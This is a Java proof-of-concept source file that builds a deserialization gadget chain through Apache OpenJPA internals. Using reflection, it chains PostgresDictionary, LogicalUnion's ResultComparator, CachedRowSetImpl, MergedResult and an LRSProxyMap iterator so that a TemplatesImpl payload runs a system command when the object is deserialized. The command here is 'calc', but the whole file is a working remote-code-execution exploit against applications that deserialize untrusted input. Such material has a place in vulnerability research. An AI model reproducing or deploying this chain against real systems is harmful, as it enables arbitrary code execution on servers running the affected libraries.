package ses.poc.openjpa;

import org.apache.openjpa.jdbc.sql.*;
import ses.poc.Caller;
import ses.poc.Gadgets;
import ses.poc.SerializationUtils;

import javax.sql.rowset.RowSetMetaDataImpl;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.sql.ResultSet;
import java.util.*;


// Press Shift twice to open the Search Everywhere dialog and type `show whitespaces`,
// then press Enter. You can now see whitespace characters in your code.
public class Main {
    public static void main(String[] args) throws Exception {

        //deserializeFromFile();
        //System.exit(0);

        String command = "calc";
        PostgresDictionary dictionary = new PostgresDictionary();
        Field classNameString = PostgresDictionary.class.getDeclaredField("PG_OBJECT_CLASS_STRING");
        Field methodString = PostgresDictionary.class.getDeclaredField("PG_OBJECT_METHOD");
        classNameString.setAccessible(true);
        methodString.setAccessible(true);

        // avoid deserialization errors because BooleanRepresentation is not serializable
        Field booleanRepresentation = DBDictionary.class.getDeclaredField("booleanRepresentation");
        booleanRepresentation.setAccessible(true);
        booleanRepresentation.set(dictionary, null);

        classNameString.set(dictionary, "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        methodString.set(dictionary, "newTransformer");

        List[] lists = new List[2];
        lists[0] = new ArrayList<Integer>();
        lists[0].add(0);

        Class<?> resultComparatorClass = Class.forName("org.apache.openjpa.jdbc.sql.LogicalUnion$ResultComparator");
        Constructor<?> resultComparatorCtor = resultComparatorClass.getConstructor(List[].class, BitSet.class, DBDictionary.class);
        resultComparatorCtor.setAccessible(true);
        MergedResult.ResultComparator comparator = (MergedResult.ResultComparator) resultComparatorCtor.newInstance(lists, null, dictionary);

        Result[] results = new Result[1];

        Class<?> rowSetClass = Class.forName("com.sun.rowset.CachedRowSetImpl");
        ResultSet resultSet = (ResultSet) rowSetClass.getConstructor().newInstance();
        Field insertRowField = rowSetClass.getDeclaredField("insertRow");
        insertRowField.setAccessible(true);
        Field onInsertRowField = rowSetClass.getDeclaredField("onInsertRow");
        onInsertRowField.setAccessible(true);
        onInsertRowField.set(resultSet, true);

        Field rowSetMDField = rowSetClass.getDeclaredField("RowSetMD");
        rowSetMDField.setAccessible(true);
        RowSetMetaDataImpl metaDataImpl = new RowSetMetaDataImpl();
        Field colCountField = RowSetMetaDataImpl.class.getDeclaredField("colCount");
        colCountField.setAccessible(true);
        colCountField.set(metaDataImpl, 1);

        rowSetMDField.set(resultSet, metaDataImpl);

        Class<?> insertRowClass = Class.forName("com.sun.rowset.internal.InsertRow");
        Object insertRow = insertRowClass.getConstructor(int.class).newInstance(1);

        Method setColumnObject = insertRowClass.getDeclaredMethod("setColumnObject", int.class, Object.class);
        setColumnObject.invoke(insertRow, 1, Gadgets.createTemplatesImpl(command));

        insertRowField.set(resultSet, insertRow);
        results[0] = new ResultSetResult(null, null, resultSet, (DBDictionary) null);

        Field lastField = AbstractResult.class.getDeclaredField("_last");
        Field ignoreNextField = AbstractResult.class.getDeclaredField("_ignoreNext");
        lastField.setAccessible(true);
        ignoreNextField.setAccessible(true);
        lastField.set(results[0], true);
        ignoreNextField.set(results[0], true);

        MergedResult result = new MergedResult(results, comparator);
        Field statusField = MergedResult.class.getDeclaredField("_status");
        statusField.setAccessible(true);
        statusField.set(result, new byte[] {0});

        Class<?> iteratorClass = Class.forName("org.apache.openjpa.jdbc.meta.strats.LRSProxyMap$ResultIterator");
        Constructor<?> iteratorConstructor = iteratorClass.getDeclaredConstructors()[0];
        System.out.println(Arrays.toString(iteratorConstructor.getParameterTypes()));
        iteratorConstructor.setAccessible(true);
        Iterator iter = (Iterator) iteratorConstructor.newInstance(null, null, null, null, new Result[] {result}, null);

        Caller caller = new Caller(iter);

        SerializationUtils.serializeDeserialize(caller);
        //serializeToFile(caller);
        //result.next();
    }



}